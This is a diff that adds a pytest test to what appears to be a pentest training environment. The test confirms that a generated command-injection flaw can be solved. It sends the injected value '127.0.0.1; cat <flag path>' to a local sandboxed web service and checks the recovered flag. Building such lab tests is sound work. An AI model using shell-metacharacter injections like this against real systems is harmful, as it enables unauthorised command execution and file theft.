@@ -134,6 +134,44 @@ def test_path_traversal_episode_recovers_flag(tmp_path: Path) -> None:
     assert report.passed, report.episode_result.reason
 
 
+def test_command_injection_episode_recovers_flag(tmp_path: Path) -> None:
+    # File loot also serves the code-exec shape: a forced command_injection
+    # oracle, solved by a real shell-metacharacter injection.
+    snap = _admit("file", vuln_kinds={"command_injection": 1})
+    vuln = next(
+        n
+        for n in snap.graph.by_kind("vulnerability")
+        if n.attrs.get("kind") == "command_injection"
+    )
+    params = vuln.attrs["params"]
+    assert isinstance(params, Mapping)
+    endpoint_id = next(e.dst for e in snap.graph.out_edges(vuln.id, "affects"))
+    url_path = str(snap.graph.nodes[endpoint_id].attrs["public_url"])
+    flag_path = next(
+        str(n.attrs["key"])
+        for n in snap.graph.by_kind("record")
+        if str(n.attrs.get("key", "")).startswith("/")
+    )
+    expected = str(snap.graph.nodes["secret_flag"].attrs["value_ref"])
+    pentest = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")
+
+    svc = EpisodeService(WebappPack(), tmp_path)
+    try:
+        handle = svc.start_episode(snap, pentest.id)
+        base = svc.surface(handle)["base_url"]
+        injection = urllib.parse.quote(f"127.0.0.1; cat {flag_path}")
+        exploit = f"{base}{url_path}?{params['target_param']}={injection}"
+        recovered = urllib.request.urlopen(exploit, timeout=10).read().decode().strip()
+        assert recovered == expected, recovered
+        (svc.solver_root(handle) / "result.json").write_text(
+            json.dumps({"flag": recovered})
+        )
+        report = svc.stop_episode(handle)
+    finally:
+        svc.close()
+    assert report.passed, report.episode_result.reason
+
+
 def test_path_traversal_wrong_path_recovers_nothing(tmp_path: Path) -> None:
     snap = _admit("file")
     url_path, param, _ = _path_traversal_target(snap.graph)
